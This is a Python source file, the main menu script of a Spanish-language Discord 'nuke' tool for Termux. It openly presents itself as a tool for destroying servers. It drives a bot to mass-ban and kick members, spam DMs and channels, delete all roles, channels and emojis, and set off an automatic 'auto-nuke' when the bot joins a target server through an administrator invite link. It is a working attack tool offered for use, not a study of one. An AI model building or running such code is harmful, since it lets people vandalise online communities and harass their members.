#!/usr/bin/env python3
"""Nuke Tool - herramienta de destruccion de servidores Discord para Termux."""
from __future__ import annotations

import asyncio
import subprocess
import sys
import time

import discord

from src import menu, ui, wizard
from src.config import load_config, save_config
from src.modules import channels, extras, members, nuke, roles
from src.modules.utils import human
from src.terminal import term

VERSION = "2.2.0"
MAX_CHANNELS = 50

try:
    import colorama

    colorama.just_fix_windows_console()
except Exception:
    pass

CONFIG = load_config()

STATE = {
    "client": None,
    "guild_id": CONFIG.get("default_guild") or None,
    "busy": False,
    "auto_nuke": bool(CONFIG.get("auto_nuke")),
    "auto_target": CONFIG.get("auto_target") or "",
    "takeover": False,
    "takeover_queue": [],
    "last": None,
}

PROMPT = "  " + ui.C.BRAND + "\u276f " + ui.RESET


# ───────────────────────── helpers ─────────────────────────

def require_client() -> bool:
    if not STATE["client"]:
        ui.error("Conecta primero el bot: opcion 19 (login) o escribe login <TOKEN>")
        return False
    return True


def invite_link(guild_id: str = "") -> str:
    client_id = getattr(STATE["client"], "application_id", None) or STATE["client"].user.id
    link = (f"https://discord.com/oauth2/authorize?client_id={client_id}"
            f"&scope=bot%20applications.commands&permissions=8")
    if guild_id:
        link += f"&guild_id={guild_id}&disable_guild_select=true"
    return link


async def pick_guild():
    if not require_client():
        return None
    guild = await menu.choose_guild(STATE["client"], STATE["guild_id"])
    if guild:
        STATE["guild_id"] = guild.id
        CONFIG["default_guild"] = str(guild.id)
        save_config(CONFIG)
    return guild


def summarize(label: str, data: dict) -> None:
    STATE["last"] = (label, data)


class busy:
    """Bloquea operaciones simultaneas, guarda el log y no ensucia la pantalla."""

    def __init__(self, label: str):
        self.label = label
        self.lines: list = []
        self.spinner = None

    def log(self, message) -> None:
        self.lines.append(str(message))

    async def __aenter__(self):
        if STATE["busy"]:
            ui.warn("Ya hay una operacion en curso.")
            return None
        STATE["busy"] = True
        ui.header(VERSION)
        ui.title(self.label)
        print()
        self.spinner = ui.Spinner(self.label).start()
        return self

    async def __aexit__(self, exc_type, exc, tb):
        STATE["busy"] = False
        if self.spinner:
            self.spinner.stop()
        for message in self.lines[-8:]:
            ui.step(message)
        return False


# ───────────────────────── cliente ─────────────────────────

def create_client() -> discord.Client:
    intents = discord.Intents.default()
    intents.members = True
    intents.message_content = True
    intents.voice_states = True
    intents.emojis_and_stickers = True

    client = discord.Client(intents=intents, chunk_guilds_at_startup=True)

    @client.event
    async def on_ready():
        pass

    @client.event
    async def on_guild_join(guild: discord.Guild):
        if not STATE["auto_nuke"]:
            return
        target = str(STATE.get("auto_target") or "")
        if target and str(guild.id) != target:
            return
        STATE["takeover_queue"].append(guild)
        STATE["takeover"] = True

    return client


async def login(token: str) -> None:
    if STATE["client"]:
        ui.warn("Ya hay una sesion activa.")
        return

    client = create_client()
    error: list = []

    async def starter():
        try:
            await client.start(token)
        except Exception as exc:
            error.append(exc)

    task = asyncio.create_task(starter())
    deadline = time.time() + 60

    while time.time() < deadline:
        if client.is_ready():
            break
        if error:
            ui.error(f"Login fallido: {error[0]}")
            task.cancel()
            return
        await asyncio.sleep(0.25)
    else:
        ui.error("Timeout de conexion (60s).")
        task.cancel()
        return

    STATE["client"] = client
    CONFIG["token"] = token
    save_config(CONFIG)
    ui.ok(f"Sesion iniciada: {client.user}")
    ui.kv("Servidores", human(len(client.guilds)))


async def run_auto_nuke() -> None:
    """Se dispara cuando el bot entra al servidor objetivo."""
    if not STATE["takeover_queue"]:
        STATE["takeover"] = False
        return

    guild = STATE["takeover_queue"].pop(0)
    STATE["takeover"] = bool(STATE["takeover_queue"])

    ui.header(VERSION)
    ui.title("Auto-nuke disparado")
    ui.kv("Servidor", guild.name)
    ui.kv("ID", guild.id)
    ui.kv("Miembros", human(guild.member_count or 0))
    print()

    mode = await menu.ask_int(
        "Modo: 1 = asistente completo, 2 = valores guardados",
        default=1, minimum=1, maximum=2)

    if mode == 1:
        options = await wizard.nuke_wizard(STATE["client"], guild)
        if not options:
            ui.info("Auto-nuke omitido.")
            return
    else:
        options = dict(CONFIG["nuke"])
        ui.info("Usando los valores guardados en los ajustes.")

    async with busy(f"Nukeando {guild.name}...") as go:
        if not go:
            return
        data = await nuke.full_nuke(guild, STATE["client"], log=go.log, **options)

    summarize(f"auto-nuke {guild.name}", data)


# ───────────────────────── acciones ─────────────────────────

ACTIONS: dict = {}


def action(name, aliases=()):
    def deco(fn):
        ACTIONS[name] = fn
        for alias in aliases:
            ACTIONS[alias] = fn
        return fn
    return deco


@action("nuke", aliases=("01", "1", "destroy", "full"))
async def act_nuke():
    guild = await pick_guild()
    if not guild:
        return
    options = await wizard.nuke_wizard(STATE["client"], guild)
    if not options:
        return ui.info("Nuke cancelado.")
    async with busy("Nukeando el servidor...") as go:
        if not go:
            return
        data = await nuke.full_nuke(guild, STATE["client"], log=go.log, **options)
    summarize("nuke total", data)


@action("banall", aliases=("02", "2", "ban"))
async def act_banall():
    guild = await pick_guild()
    if not guild:
        return
    reason = await menu.ask("Razon del baneo", default="nuke")
    async with busy("Baneando miembros...") as go:
        if not go:
            return
        n = await members.ban_all(guild, STATE["client"], reason=reason,
                                  concurrency=CONFIG["nuke"]["concurrency"], log=go.log)
    summarize("banall", {"miembros_baneados": human(n)})


@action("kickall", aliases=("03", "3", "kick"))
async def act_kickall():
    guild = await pick_guild()
    if not guild:
        return
    async with busy("Expulsando miembros...") as go:
        if not go:
            return
        n = await members.kick_all(guild, STATE["client"], log=go.log)
    summarize("kickall", {"miembros_expulsados": human(n)})


@action("nickall", aliases=("04", "4"))
async def act_nickall():
    guild = await pick_guild()
    if not guild:
        return
    nick = await menu.ask("Nick para todos", default="nuked")
    async with busy("Renombrando miembros...") as go:
        if not go:
            return
        n = await members.nick_all(guild, nick, log=go.log)
    summarize("nickall", {"nicks_cambiados": human(n), "nick": nick})


@action("dmall", aliases=("05", "5", "dm"))
async def act_dmall():
    guild = await pick_guild()
    if not guild:
        return
    options = await wizard.dm_wizard(guild)
    if not options:
        return ui.info("DM cancelado.")
    async with busy("Enviando DMs...") as go:
        if not go:
            return
        n = await members.dm_all(guild, options["message"], times=options["times"],
                                 limit=options["limit"], log=go.log)
    summarize("dm masivo", {
        "mensajes_enviados": human(n),
        "por_miembro": options["times"],
        "miembros": options["limit"] or "todos",
    })


@action("spam", aliases=("06", "6"))
async def act_spam():
    guild = await pick_guild()
    if not guild:
        return
    options = await wizard.spam_wizard(guild)
    if not options:
        return ui.info("Spam cancelado.")
    async with busy("Enviando spam...") as go:
        if not go:
            return
        n = await extras.spam_channel(options["channel"], options["message"],
                                      options["times"], log=go.log)
    summarize("spam", {"mensajes": human(n), "canal": "#" + options["channel"].name})


@action("roledestroy", aliases=("07", "7", "roledel"))
async def act_roledestroy():
    guild = await pick_guild()
    if not guild:
        return
    async with busy("Borrando roles...") as go:
        if not go:
            return
        n = await roles.destroy_roles(guild, log=go.log)
    summarize("roledestroy", {"roles_borrados": human(n)})


@action("rolespam", aliases=("08", "8"))
async def act_rolespam():
    guild = await pick_guild()
    if not guild:
        return
    count = await menu.ask_int("Cuantos roles", default=10, minimum=1, maximum=100)
    name = await menu.ask("Nombre base", default="nuked")
    async with busy("Creando roles...") as go:
        if not go:
            return
        n = await roles.spam_roles(guild, count, name=name, log=go.log)
    summarize("rolespam", {"roles_creados": human(n)})


@action("chandestroy", aliases=("09", "9", "chandel"))
async def act_chandestroy():
    guild = await pick_guild()
    if not guild:
        return
    async with busy("Borrando canales...") as go:
        if not go:
            return
        n = await channels.destroy_channels(guild, log=go.log)
    summarize("chandestroy", {"canales_borrados": human(n)})


@action("chanspam", aliases=("10",))
async def act_chanspam():
    guild = await pick_guild()
    if not guild:
        return
    count = await menu.ask_int(f"Cuantos canales (max {MAX_CHANNELS})", default=15,
                               minimum=1, maximum=MAX_CHANNELS)
    name = await menu.ask("Nombre base", default="nuke")
    kind = "voice" if await menu.ask_bool("Canales de voz", default=False) else "text"
    async with busy("Creando canales...") as go:
        if not go:
            return
        created = await channels.spam_channels(guild, count, kind=kind, name=name, log=go.log)
    summarize("chanspam", {"canales_creados": human(len(created)), "tipo": kind})


@action("emojidestroy", aliases=("11",))
async def act_emojis():
    guild = await pick_guild()
    if not guild:
        return
    async with busy("Borrando emojis y stickers...") as go:
        if not go:
            return
        e = await extras.delete_emojis(guild, log=go.log)
        s = await extras.delete_stickers(guild, log=go.log)
    summarize("emojidestroy", {"emojis": human(e), "stickers": human(s)})


@action("vcdisconnect", aliases=("12", "vckick"))
async def act_vc():
    guild = await pick_guild()
    if not guild:
        return
    async with busy("Desconectando de voz...") as go:
        if not go:
            return
        n = await extras.disconnect_voice(guild, log=go.log)
    summarize("vcdisconnect", {"usuarios": human(n)})


@action("rename", aliases=("13", "guildname"))
async def act_rename():
    guild = await pick_guild()
    if not guild:
        return
    name = await menu.ask("Nuevo nombre del servidor", default=guild.name)
    try:
        await guild.edit(name=name[:100], reason="nuke")
        summarize("rename", {"servidor": name})
    except Exception as exc:
        ui.error(str(exc))


@action("icon", aliases=("14", "foto"))
async def act_icon():
    guild = await pick_guild()
    if not guild:
        return
    ui.plain("Ruta local (ej: /sdcard/foto.png) o URL directa a la imagen.")
    source = await menu.ask("Foto del servidor")
    if not source:
        return
    async with busy("Subiendo foto...") as go:
        if not go:
            return
        await extras.set_icon(guild, source)
    summarize("foto", {"servidor": guild.name, "estado": "actualizada"})


@action("status", aliases=("15",))
async def act_status():
    if not require_client():
        return
    kind = await menu.ask("Tipo (playing/watching/listening/competing)", default="playing")
    text = await menu.ask("Texto del estado", default="nuking servers")
    await extras.set_status(STATE["client"], text, kind)
    summarize("status", {"estado": f"{kind} {text}"})


@action("info", aliases=("16",))
async def act_info():
    guild = await pick_guild()
    if not guild:
        return
    async with busy("Recopilando datos...") as go:
        if not go:
            return
        members_list = await members.fetch_all_members(guild)
        ui.title("Servidor")
        ui.kv("Nombre", guild.name)
        ui.kv("ID", guild.id)
        ui.kv("Owner", guild.owner.user if guild.owner else "desconocido")
        ui.kv("Miembros", human(len(members_list)))
        ui.kv("Canales", human(len(guild.channels)))
        ui.kv("Roles", human(len(guild.roles)))
        ui.kv("Emojis", human(len(guild.emojis)))
        ui.kv("Boost", f"nivel {guild.premium_tier}")


@action("auto", aliases=("17", "autonuke"))
async def act_auto():
    if not require_client():
        return

    ui.title("Auto-nuke")
    ui.kv("Estado", "activado" if STATE["auto_nuke"] else "desactivado")
    ui.kv("Servidor objetivo", STATE["auto_target"] or "cualquiera")
    print()

    if not await menu.ask_bool("Activar auto-nuke", default=STATE["auto_nuke"]):
        STATE["auto_nuke"] = False
        CONFIG["auto_nuke"] = False
        save_config(CONFIG)
        return ui.ok("Auto-nuke desactivado.")

    target = await menu.ask(
        "ID del servidor objetivo (Enter = cualquiera)",
        default=STATE["auto_target"] or None, optional=True)

    if target and not target.isdigit():
        return ui.error("El ID debe ser numerico.")

    target = target or ""
    STATE["auto_nuke"] = True
    STATE["auto_target"] = target
    CONFIG["auto_nuke"] = True
    CONFIG["auto_target"] = target
    save_config(CONFIG)

    link = invite_link(target)
    ui.ok("Auto-nuke armado." + (f" Objetivo: {target}" if target else " Objetivo: cualquiera"))
    print()
    ui.plain("Link de invitacion con permisos de administrador:")
    print()
    print("  " + ui.C.ACCENT + link + ui.C.RESET)
    print()
    if target:
        ui.plain("El link fuerza la entrada a ese servidor. Al entrar, arranca el asistente.")
    else:
        ui.plain("Al entrar a cualquier servidor, arranca el asistente.")
    ui.plain("Si el bot ya esta dentro, expulsalo antes de usar el link.")

    if await menu.ask_bool("Abrir el link ahora", default=True):
        try:
            subprocess.Popen(["termux-open-url", link])
        except Exception as exc:
            ui.warn(f"No se pudo abrir: {exc}")


@action("config", aliases=("18", "ajustes"))
async def act_config():
    ui.title("Ajustes")
    for key, value in CONFIG["nuke"].items():
        ui.line(key, value)
    print()
    key = await menu.ask("Clave a editar (Enter = salir)", optional=True)
    if not key:
        return
    if key not in CONFIG["nuke"]:
        return ui.error(f"Clave desconocida: {key}")
    current = CONFIG["nuke"][key]
    if isinstance(current, bool):
        CONFIG["nuke"][key] = await menu.ask_bool(key, default=current)
    elif isinstance(current, int):
        CONFIG["nuke"][key] = await menu.ask_int(key, default=current, minimum=0, maximum=100)
    else:
        CONFIG["nuke"][key] = await menu.ask(key, default=current)
    save_config(CONFIG)
    ui.ok(f"{key} = {CONFIG['nuke'][key]}")


@action("login", aliases=("19", "start"))
async def act_login():
    token = await menu.ask("Token del bot", default=CONFIG.get("token") or None)
    if token:
        await login(token)


@action("logout", aliases=("20",))
async def act_logout():
    if not STATE["client"]:
        return ui.warn("No hay sesion activa.")
    await STATE["client"].close()
    STATE["client"] = None
    ui.ok("Sesion cerrada.")


@action("guilds", aliases=("21", "servers"))
async def act_guilds():
    await pick_guild()


@action("help", aliases=("22", "?"))
async def act_help():
    render_menu(full=True)
    await menu.pause()


@action("exit", aliases=("00", "0", "quit", "q"))
async def act_exit():
    if STATE["client"]:
        await STATE["client"].close()
    ui.clear()
    ui.ok("Hasta luego.")
    sys.exit(0)


# ───────────────────────── menu ─────────────────────────

MENU = [
    ("01", "Nuke total", "destruye y reconstruye"),
    ("02", "Banear a todos", "ban masivo"),
    ("03", "Expulsar a todos", "kick masivo"),
    ("04", "Cambiar nick", "nick para todos"),
    ("05", "DM masivo", "mensajes privados a todos"),
    ("06", "Spam de mensajes", "repite un mensaje N veces"),
    ("07", "Borrar roles", "elimina todos los roles"),
    ("08", "Crear roles", "N roles con admin"),
    ("09", "Borrar canales", "elimina todos los canales"),
    ("10", "Crear canales", "max 50"),
    ("11", "Borrar emojis/stickers", "limpia emojis y stickers"),
    ("12", "Desconectar de voz", "saca a todos de los VC"),
    ("13", "Renombrar servidor", "cambia el nombre"),
    ("14", "Cambiar foto", "ruta local o URL"),
    ("15", "Estado del bot", "presencia del bot"),
    ("16", "Info del servidor", "datos del servidor"),
    ("17", "Auto-nuke", "nuke al entrar a un servidor"),
    ("18", "Ajustes", "parametros del nuke"),
    ("19", "Login", "conecta el bot"),
    ("20", "Logout", "desconecta el bot"),
    ("21", "Cambiar servidor", "elige otro servidor"),
    ("22", "Ayuda", "explicacion de opciones"),
    ("00", "Salir", "cierra el programa"),
]


def render_menu(full: bool = False) -> None:
    ui.header(VERSION)

    if STATE["client"]:
        guild = STATE["client"].get_guild(int(STATE["guild_id"])) if STATE["guild_id"] else None
        ui.kv("Bot", STATE["client"].user)
        ui.kv("Servidor", guild.name if guild else "sin seleccionar")
        ui.kv("Auto-nuke", "activado" if STATE["auto_nuke"] else "desactivado")
        if STATE["auto_nuke"]:
            ui.kv("Objetivo", STATE["auto_target"] or "cualquiera")
    else:
        ui.kv("Estado", "sin conexion")

    if STATE["last"]:
        label, data = STATE["last"]
        print()
        print("  " + ui.C.BRAND + "\u25b8 ULTIMA ACCION" + ui.C.RESET
              + ui.C.MUTED + f"  {label}" + ui.C.RESET)
        for key, value in list(data.items())[:5]:
            ui.line(key, value)

    print()
    ui.title("Menu principal")
    for number, label, desc in MENU:
        print("  " + ui.C.BRAND + number + ui.C.RESET + "  "
              + ui.C.TEXT + label.ljust(24) + ui.C.RESET
              + ui.C.MUTED + desc + ui.C.RESET)
    print()
    print("  " + ui.C.MUTED + "Numero, o comando directo (nuke, dmall, spam...)" + ui.C.RESET)


async def menu_loop() -> None:
    while True:
        render_menu()
        answer = await term.read_until(PROMPT, lambda: STATE["takeover"])

        if answer is None:
            await run_auto_nuke()
            continue

        raw = answer.strip().lower()
        if not raw:
            continue

        handler = ACTIONS.get(raw)
        if not handler:
            ui.error(f'Opcion invalida: "{raw}"')
            await menu.pause()
            continue

        try:
            await handler()
        except SystemExit:
            raise
        except Exception as exc:
            ui.error(f"{type(exc).__name__}: {exc}")

        await menu.pause()


async def run() -> None:
    term.start()
    ui.print_banner(VERSION)

    if CONFIG.get("token"):
        ui.info("Token detectado en config.json, conectando...")
        await login(CONFIG["token"])
    else:
        ui.warn("Sin token. Elige la opcion 19 para conectar el bot.")

    if STATE["auto_nuke"]:
        ui.kv("Auto-nuke", "armado")
        if STATE["auto_target"]:
            ui.kv("Objetivo", STATE["auto_target"])

    await menu.pause("Enter para abrir el menu")

    try:
        await menu_loop()
    finally:
        if STATE["client"]:
            await STATE["client"].close()
            ui.plain("Cliente desconectado.")


def main() -> None:
    try:
        asyncio.run(run())
    except KeyboardInterrupt:
        print()
        ui.ok("Hasta luego.")


if __name__ == "__main__":
    main()